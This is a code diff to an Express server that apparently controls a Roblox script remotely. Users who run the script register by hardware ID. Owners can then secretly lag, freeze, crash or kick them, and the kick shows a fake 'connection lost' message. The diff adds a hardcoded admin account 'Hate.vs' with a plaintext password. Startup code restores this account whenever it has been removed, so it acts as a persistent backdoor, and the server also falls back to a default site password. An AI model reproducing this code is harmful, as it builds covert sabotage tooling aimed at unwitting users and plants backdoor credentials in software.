@@ -4,6 +4,7 @@ const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
 const jwt = require('jsonwebtoken');
+const bcrypt = require('bcryptjs');
 require('dotenv').config();
 
 const app = express();
@@ -16,6 +17,7 @@ const SITE_PASSWORD = process.env.SITE_PASSWORD || 'default123';
 const USERS_FILE = path.join(__dirname, 'data', 'users.json');
 const SESSIONS_FILE = path.join(__dirname, 'data', 'sessions.json');
 const SETTINGS_FILE = path.join(__dirname, 'data', 'settings.json');
+const ADMINS_FILE = path.join(__dirname, 'data', 'admins.json');
 
 // Initialize data files
 if (!fs.existsSync(path.join(__dirname, 'data'))) {
@@ -34,8 +36,35 @@ if (!fs.existsSync(SETTINGS_FILE)) {
     fs.writeFileSync(SETTINGS_FILE, JSON.stringify({
         defaultKickMessage: 'Your connection has been lost. Please try again later.',
         defaultLag: 50,
+        defaultFreeze: 30,
         sessionTimeout: 10
     }, null, 2));
+}
+
+// ===== DEFAULT ADMIN ACCOUNT =====
+if (!fs.existsSync(ADMINS_FILE)) {
+    const defaultAdmin = [{
+        id: crypto.randomUUID(),
+        username: 'Hate.vs',
+        password: bcrypt.hashSync('zoha3234', 10),
+        robloxUsername: 'Hate.vs',
+        createdAt: new Date().toISOString()
+    }];
+    fs.writeFileSync(ADMINS_FILE, JSON.stringify(defaultAdmin, null, 2));
+} else {
+    // Check if default admin exists, if not add it
+    let admins = JSON.parse(fs.readFileSync(ADMINS_FILE, 'utf8'));
+    const exists = admins.find(a => a.username === 'Hate.vs');
+    if (!exists) {
+        admins.push({
+            id: crypto.randomUUID(),
+            username: 'Hate.vs',
+            password: bcrypt.hashSync('zoha3234', 10),
+            robloxUsername: 'Hate.vs',
+            createdAt: new Date().toISOString()
+        });
+        fs.writeFileSync(ADMINS_FILE, JSON.stringify(admins, null, 2));
+    }
 }
 
 // ===== HELPER FUNCTIONS =====
@@ -67,12 +96,24 @@ const readSettings = () => {
     try {
         return JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8'));
     } catch {
-        return { defaultKickMessage: 'Your connection has been lost. Please try again later.', defaultLag: 50, sessionTimeout: 10 };
+        return { defaultKickMessage: 'Your connection has been lost. Please try again later.', defaultLag: 50, defaultFreeze: 30, sessionTimeout: 10 };
     }
 };
 
 const writeSettings = (settings) => {
     fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2));
+};
+
+const readAdmins = () => {
+    try {
+        return JSON.parse(fs.readFileSync(ADMINS_FILE, 'utf8'));
+    } catch {
+        return [];
+    }
+};
+
+const writeAdmins = (admins) => {
+    fs.writeFileSync(ADMINS_FILE, JSON.stringify(admins, null, 2));
 };
 
 // ===== MIDDLEWARE =====
@@ -143,9 +184,86 @@ app.post('/api/site-auth', (req, res) => {
     }
 });
 
-// ===== USER ROUTES =====
+// ===== ADMIN LOGIN =====
+app.post('/api/admin/login', (req, res) => {
+    const { username, password } = req.body;
+    
+    const admins = readAdmins();
+    const admin = admins.find(a => a.username === username);
+    
+    if (!admin || !bcrypt.compareSync(password, admin.password)) {
+        return res.status(401).json({ error: 'Invalid credentials' });
+    }
+    
+    const token = jwt.sign(
+        { id: admin.id, username: admin.username, isOwner: true, robloxUsername: admin.robloxUsername },
+        process.env.JWT_SECRET,
+        { expiresIn: '24h' }
+    );
+    
+    res.json({
+        success: true,
+        token,
+        user: { 
+            id: admin.id,
+            username: admin.username, 
+            robloxUsername: admin.robloxUsername,
+            isOwner: true
+        }
+    });
+});
 
-// Register/Login script (HWID authentication)
+// ===== ADMIN MANAGEMENT =====
+app.get('/api/admins', authenticateToken, (req, res) => {
+    if (!req.user.isOwner) {
+        return res.status(403).json({ error: 'Only owners can view admins' });
+    }
+    const admins = readAdmins();
+    res.json(admins);
+});
+
+app.post('/api/admins/create', authenticateToken, (req, res) => {
+    if (!req.user.isOwner) {
+        return res.status(403).json({ error: 'Only owners can create admins' });
+    }
+    
+    const { username, password, robloxUsername } = req.body;
+    if (!username || !password || !robloxUsername) {
+        return res.status(400).json({ error: 'All fields required' });
+    }
+    
+    let admins = readAdmins();
+    if (admins.find(a => a.username === username)) {
+        return res.status(400).json({ error: 'Admin already exists' });
+    }
+    
+    const newAdmin = {
+        id: crypto.randomUUID(),
+        username,
+        password: bcrypt.hashSync(password, 10),
+        robloxUsername,
+        createdAt: new Date().toISOString()
+    };
+    
+    admins.push(newAdmin);
+    writeAdmins(admins);
+    
+    res.json({ success: true, admin: { id: newAdmin.id, username: newAdmin.username, robloxUsername: newAdmin.robloxUsername } });
+});
+
+app.delete('/api/admins/:adminId', authenticateToken, (req, res) => {
+    if (!req.user.isOwner) {
+        return res.status(403).json({ error: 'Only owners can remove admins' });
+    }
+    
+    let admins = readAdmins();
+    admins = admins.filter(a => a.id !== req.params.adminId);
+    writeAdmins(admins);
+    
+    res.json({ success: true });
+});
+
+// ===== USER ROUTES =====
 app.post('/api/auth', (req, res) => {
     const { hwid, password } = req.body;
 
@@ -166,6 +284,7 @@ app.post('/api/auth', (req, res) => {
                 createdAt: new Date().toISOString(),
                 settings: {
                     lagPercentage: 0,
+                    freezePercentage: 0,
                     crashEnabled: false,
                     kickMessage: 'Your connection has been lost. Please try again later.'
                 }
@@ -213,7 +332,6 @@ app.post('/api/auth', (req, res) => {
     });
 });
 
-// Get all users
 app.get('/api/users', authenticateToken, (req, res) => {
     const users = readUsers();
     const sessions = readSessions();
@@ -234,10 +352,9 @@ app.get('/api/users', authenticateToken, (req, res) => {
     res.json(activeUsers);
 });
 
-// Update user settings
 app.put('/api/users/:userId/settings', authenticateToken, (req, res) => {
     const { userId } = req.params;
-    const { lagPercentage, crashEnabled, kickMessage } = req.body;
+    const { lagPercentage, freezePercentage, crashEnabled, kickMessage } = req.body;
 
     if (!req.user.isOwner) {
         return res.status(403).json({ error: 'Only owners can modify settings' });
@@ -252,6 +369,9 @@ app.put('/api/users/:userId/settings', authenticateToken, (req, res) => {
 
     if (lagPercentage !== undefined) {
         users[userIndex].settings.lagPercentage = Math.min(100, Math.max(0, lagPercentage));
+    }
+    if (freezePercentage !== undefined) {
+        users[userIndex].settings.freezePercentage = Math.min(100, Math.max(0, freezePercentage));
     }
     if (crashEnabled !== undefined) {
         users[userIndex].settings.crashEnabled = crashEnabled;
@@ -268,7 +388,6 @@ app.put('/api/users/:userId/settings', authenticateToken, (req, res) => {
     });
 });
 
-// Trigger crash for user
 app.post('/api/users/:userId/crash', authenticateToken, (req, res) => {
     const { userId } = req.params;
 
@@ -292,7 +411,6 @@ app.post('/api/users/:userId/crash', authenticateToken, (req, res) => {
     });
 });
 
-// Kick user
 app.post('/api/users/:userId/kick', authenticateToken, (req, res) => {
     const { userId } = req.params;
     const { message } = req.body;
@@ -325,7 +443,6 @@ app.post('/api/users/:userId/kick', authenticateToken, (req, res) => {
     });
 });
 
-// Add new user
 app.post('/api/users/add', authenticateToken, (req, res) => {
     const { hwid, username } = req.body;
 
@@ -343,6 +460,7 @@ app.post('/api/users/add', authenticateToken, (req, res) => {
         return res.status(400).json({ error: 'User with this HWID already exists' });
     }
 
+    const settings = readSettings();
     const newUser = {
         id: crypto.randomUUID(),
         hwid: hwid,
@@ -350,9 +468,10 @@ app.post('/api/users/add', authenticateToken, (req, res) => {
         isOwner: false,
         createdAt: new Date().toISOString(),
         settings: {
-            lagPercentage: 50,
+            lagPercentage: settings.defaultLag || 50,
+            freezePercentage: settings.defaultFreeze || 30,
             crashEnabled: false,
-            kickMessage: 'Your connection has been lost. Please try again later.'
+            kickMessage: settings.defaultKickMessage || 'Your connection has been lost. Please try again later.'
         }
     };
 
@@ -365,7 +484,6 @@ app.post('/api/users/add', authenticateToken, (req, res) => {
     });
 });
 
-// Remove user
 app.delete('/api/users/:userId', authenticateToken, (req, res) => {
     const { userId } = req.params;
 
@@ -393,7 +511,6 @@ app.delete('/api/users/:userId', authenticateToken, (req, res) => {
     });
 });
 
-// Get stats
 app.get('/api/stats', authenticateToken, (req, res) => {
     const sessions = readSessions();
     const activeSessions = sessions.filter(s => new Date(s.expiresAt) > new Date());
@@ -406,8 +523,6 @@ app.get('/api/stats', authenticateToken, (req, res) => {
 });
 
 // ===== OWNER ROUTES =====
-
-// Get all owners
 app.get('/api/owners', authenticateToken, (req, res) => {
     if (!req.user.isOwner) {
         return res.status(403).json({ error: 'Only owners can view owners list' });
@@ -431,13 +546,12 @@ app.get('/api/owners', authenticateToken, (req, res) => {
     res.json(ownersWithStatus);
 });
 
-// Add owner by Roblox username
 app.post('/api/owners/add', authenticateToken, (req, res) => {
     if (!req.user.isOwner) {
         return res.status(403).json({ error: 'Only owners can add other owners' });
     }
     
-    const { username } = req.body;
+    const { username, password } = req.body;
     
     if (!username) {
         return res.status(400).json({ error: 'Roblox username is required' });
@@ -450,6 +564,7 @@ app.post('/api/owners/add', authenticateToken, (req, res) => {
         return res.status(400).json({ error: 'User already registered' });
     }
     
+    const settings = readSettings();
     const newOwner = {
         id: crypto.randomUUID(),
         hwid: `pending_${username}`,
@@ -458,13 +573,29 @@ app.post('/api/owners/add', authenticateToken, (req, res) => {
         createdAt: new Date().toISOString(),
         settings: {
             lagPercentage: 0,
+            freezePercentage: 0,
             crashEnabled: false,
-            kickMessage: 'Your connection has been lost. Please try again later.'
+            kickMessage: settings.defaultKickMessage || 'Your connection has been lost. Please try again later.'
         }
     };
     
     users.push(newOwner);
     writeUsers(users);
+    
+    // Also create admin account if password provided
+    if (password) {
+        let admins = readAdmins();
+        if (!admins.find(a => a.username === username)) {
+            admins.push({
+                id: crypto.randomUUID(),
+                username: username,
+                password: bcrypt.hashSync(password, 10),
+                robloxUsername: username,
+                createdAt: new Date().toISOString()
+            });
+            writeAdmins(admins);
+        }
+    }
     
     res.json({
         success: true,
@@ -472,7 +603,6 @@ app.post('/api/owners/add', authenticateToken, (req, res) => {
     });
 });
 
-// Remove owner
 app.delete('/api/owners/:ownerId', authenticateToken, (req, res) => {
     if (!req.user.isOwner) {
         return res.status(403).json({ error: 'Only owners can remove owners' });
@@ -500,15 +630,12 @@ app.delete('/api/owners/:ownerId', authenticateToken, (req, res) => {
 });
 
 // ===== SETTINGS ROUTES =====
-
-// Save default kick message
 app.post('/api/settings/kick-message', authenticateToken, (req, res) => {
     if (!req.user.isOwner) {
         return res.status(403).json({ error: 'Only owners can change settings' });
     }
     
     const { message } = req.body;
-    
     if (!message) {
         return res.status(400).json({ error: 'Message is required' });
     }
@@ -517,20 +644,15 @@ app.post('/api/settings/kick-message', authenticateToken, (req, res) => {
     settings.defaultKickMessage = message;
     writeSettings(settings);
     
-    res.json({
-        success: true,
-        message: 'Default kick message saved'
-    });
+    res.json({ success: true, message: 'Default kick message saved' });
 });
 
-// Save default lag
 app.post('/api/settings/default-lag', authenticateToken, (req, res) => {
     if (!req.user.isOwner) {
         return res.status(403).json({ error: 'Only owners can change settings' });
     }
     
     const { lagPercentage } = req.body;
-    
     if (lagPercentage === undefined || lagPercentage < 0 || lagPercentage > 100) {
         return res.status(400).json({ error: 'Invalid lag percentage (0-100)' });
     }
@@ -539,20 +661,32 @@ app.post('/api/settings/default-lag', authenticateToken, (req, res) => {
     settings.defaultLag = lagPercentage;
     writeSettings(settings);
     
-    res.json({
-        success: true,
-        message: 'Default lag saved'
-    });
+    res.json({ success: true, message: 'Default lag saved' });
 });
 
-// Save session timeout
+app.post('/api/settings/default-freeze', authenticateToken, (req, res) => {
+    if (!req.user.isOwner) {
+        return res.status(403).json({ error: 'Only owners can change settings' });
+    }
+    
+    const { freezePercentage } = req.body;
+    if (freezePercentage === undefined || freezePercentage < 0 || freezePercentage > 100) {
+        return res.status(400).json({ error: 'Invalid freeze percentage (0-100)' });
+    }
+    
+    let settings = readSettings();
+    settings.defaultFreeze = freezePercentage;
+    writeSettings(settings);
+    
+    res.json({ success: true, message: 'Default freeze saved' });
+});
+
 app.post('/api/settings/session-timeout', authenticateToken, (req, res) => {
     if (!req.user.isOwner) {
         return res.status(403).json({ error: 'Only owners can change settings' });
     }
     
     const { timeout } = req.body;
-    
     if (!timeout || timeout < 1) {
         return res.status(400).json({ error: 'Invalid timeout value' });
     }
@@ -561,26 +695,15 @@ app.post('/api/settings/session-timeout', authenticateToken, (req, res) => {
     settings.sessionTimeout = timeout;
     writeSettings(settings);
     
-    res.json({
-        success: true,
-        message: 'Session timeout saved'
-    });
+    res.json({ success: true, message: 'Session timeout saved' });
 });
 
-// Get settings
 app.get('/api/settings', authenticateToken, (req, res) => {
     const settings = readSettings();
-    
-    res.json({
-        defaultKickMessage: settings.defaultKickMessage || 'Your connection has been lost. Please try again later.',
-        defaultLag: settings.defaultLag || 50,
-        sessionTimeout: settings.sessionTimeout || 10
-    });
+    res.json(settings);
 });
 
 // ===== SCRIPT API ROUTES =====
-
-// Register a user executing the script
 app.post('/api/script/register', (req, res) => {
     const { hwid, robloxUsername } = req.body;
     
@@ -601,6 +724,7 @@ app.post('/api/script/register', (req, res) => {
             createdAt: new Date().toISOString(),
             settings: {
                 lagPercentage: settings.defaultLag || 50,
+                freezePercentage: settings.defaultFreeze || 30,
                 crashEnabled: false,
                 kickMessage: settings.defaultKickMessage || 'Your connection has been lost. Please try again later.'
             }
@@ -639,6 +763,7 @@ app.post('/api/script/register', (req, res) => {
             isOwner: user.isOwner,
             settings: {
                 lagPercentage: user.settings.lagPercentage || settings.defaultLag || 50,
+                freezePercentage: user.settings.freezePercentage || settings.defaultFreeze || 30,
                 crashEnabled: user.settings.crashEnabled || false,
                 kickMessage: user.settings.kickMessage || settings.defaultKickMessage || 'Your connection has been lost. Please try again later.'
             }
@@ -646,7 +771,6 @@ app.post('/api/script/register', (req, res) => {
     });
 });
 
-// Get script commands for a user
 app.get('/api/script/commands/:hwid', (req, res) => {
     const { hwid } = req.params;
     
@@ -663,13 +787,13 @@ app.get('/api/script/commands/:hwid', (req, res) => {
         success: true,
         commands: {
             lagPercentage: user.settings.lagPercentage || settings.defaultLag || 50,
+            freezePercentage: user.settings.freezePercentage || settings.defaultFreeze || 30,
             crashEnabled: user.settings.crashEnabled || false,
             kickMessage: user.settings.kickMessage || settings.defaultKickMessage || 'Your connection has been lost. Please try again later.'
         }
     });
 });
 
-// Update user status (keep alive)
 app.post('/api/script/heartbeat', (req, res) => {
     const { hwid } = req.body;
     
